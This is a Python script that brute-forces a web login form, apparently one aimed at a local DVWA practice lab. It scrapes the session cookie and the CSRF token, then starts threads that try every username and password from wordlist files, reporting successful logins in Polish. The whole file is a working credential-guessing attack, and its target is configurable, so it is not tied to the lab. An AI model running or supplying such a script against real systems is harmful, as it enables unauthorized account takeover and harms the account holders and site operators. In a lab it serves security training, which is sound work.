import requests
from bs4 import BeautifulSoup
import requests
import urllib
import time
import threading
from settings import *


def Sign_in(url_start, user, password):
    password = password.strip()
    user = user.strip()
    headers={
    'Referer':f'{LOGIN_LINK}',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Connection':'keep-alive',
    'Content-Length':'88',
    'Content-Type':'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests':'1',
    'Cookie':a[0]}
    values={
        'username':f'{user}',
        'password':f'{password}',
        'Login':'Login',
        'user_token':a[1]
    }
    datas=urllib.parse.urlencode(values)
    response=requests.post(url_start,data=datas,headers=headers)
    response=requests.get(f"{LINK_AFTER_LOGIN}", headers=headers)
    if "You have logged in as" in response.text:
        print(f'Sukces {user}, {password}')
    else:
        print(f'Próba nieudana dla hasła {password}')


def get_cookie_token(url_start):
    headers={'Host':'127.0.0.1',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection':'keep-alive',
            'Upgrade-Insecure-Requests':'1'}
    res=requests.get(url_start,headers=headers)
    cookies=res.cookies
    print(type(cookies))
    html=res.text
    soup=BeautifulSoup(html,"html.parser")
    s=soup.find('input',type='hidden').get('value')
    print(cookies.items())
    cook=cookies.items()
    cook[1]=('security','medium')
    a=[(';'.join(['='.join(item)for item in cook]))]
    a.append(s)
    return a

url=f"{LOGIN_LINK}"
a=get_cookie_token(url)

 
with open(f"{USERS_FILE}", 'r', encoding="utf-8") as names:
    for username in names:
        with open(f"{PASSWORDS_FILE}", 'r', encoding='utf-8') as passwords:
            for password in passwords:
                t = threading.Thread(target=Sign_in, args=(url, username, password))
                t.start()
                time.sleep(0.5)
